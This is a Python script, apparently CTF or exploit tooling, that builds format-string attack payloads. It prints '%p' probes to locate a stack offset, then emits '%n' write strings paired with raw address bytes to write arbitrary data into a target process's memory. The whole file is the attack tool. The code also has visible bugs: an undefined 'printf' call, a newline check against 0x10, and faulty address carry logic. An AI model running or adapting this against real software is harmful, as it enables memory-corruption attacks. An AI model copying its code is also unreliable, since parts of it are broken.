"""Used for multiple pass printf"""

import sys
import base64
import math

# 65536
base_str = "%.00000%00000$p AAAAAAAA"

def get_one(val, offset, action, alignment):
  # We need to align to 8 char boundary
  new_action_len = (math.ceil((len(action) - alignment)/8) * 8) + alignment
  action = action.ljust(max(new_action_len, alignment))

  return f"%3$.{val:05}x%{offset:05}${action}"

if len(sys.argv) == 3:
  alignment = int(sys.argv[2])
  for i in range(1, int(sys.argv[1]) + 1):
    print(f"{get_one(0, i, 'p', alignment)}BAAAAAAA @ {i}")
  exit(0)
elif len(sys.argv) != 6:
  print(f"{sys.argv[0]} <offset> <alignment> (<base64> <address> <word_size>)")
  print("Offset and algnment should be configured to the point where the hex ends with 0x42, and the other bytes are 0x41")
  exit(1)

offset = int(sys.argv[1])
alignment = int(sys.argv[2])
data = list(base64.b64decode(sys.argv[3]))
address = list(base64.b16decode(sys.argv[4].upper()))
word_size = int(sys.argv[5])

# Finish the address
while len(address) < word_size:
  address.insert(0, 0)

address.reverse()

orig_address = address

"""65536 is how big it can get before the output len becomes *really* bad"""

for i in range(0, len(data), 2):
  val = data[i + 1] << 8 | data[i];
  for b in address:
    if b == 0x10:
      printf("ASCII newline in address!");
      exit(2)
  sys.stdout.write(get_one(val, offset, 'n', alignment))
  sys.stdout.flush();
  sys.stdout.buffer.write(bytes(address))
  sys.stdout.flush();
  sys.stdout.write("\n")
  sys.stdout.flush();
  # increment address
  for i in range(0, len(address)):
    address[i] += 2
    address[i] %= 256
    sys.stderr.write(f'{address[i]:02x}\n')
    if (address[i] > 1):
      break
  sys.stderr.flush()

print(get_one(0, offset, 'p', alignment))
